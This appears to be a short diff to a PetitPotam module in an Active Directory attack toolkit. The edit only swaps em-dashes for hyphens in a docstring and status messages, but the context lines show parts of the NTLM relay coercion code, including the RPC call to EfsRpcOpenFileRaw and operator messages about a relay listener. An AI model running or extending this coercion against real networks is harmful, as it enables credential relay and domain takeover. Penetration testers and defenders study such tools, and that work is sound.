@@ -1,4 +1,4 @@
-"""PetitPotam — NTLM relay via EfsRpcOpenFileRaw (MS-EFSR)."""
+"""PetitPotam  -  NTLM relay via EfsRpcOpenFileRaw (MS-EFSR)."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -63,14 +63,14 @@ def run(args: Any) -> int:
         request += b"\x00\x00\x00\x00"
 
         dce.call(0, request)
-        print(f"[+] PetitPotam coercion sent — check relay listener on {listener}")
+        print(f"[+] PetitPotam coercion sent  -  check relay listener on {listener}")
         dce.disconnect()
         return 0
 
     except Exception as exc:
         error_str = str(exc)
         if "rpc_s_access_denied" in error_str.lower():
-            print("[-] Access denied — unauthenticated coercion may be patched")
+            print("[-] Access denied  -  unauthenticated coercion may be patched")
         else:
             print(f"[+] Coercion likely triggered (error expected): {error_str}")
         return 0
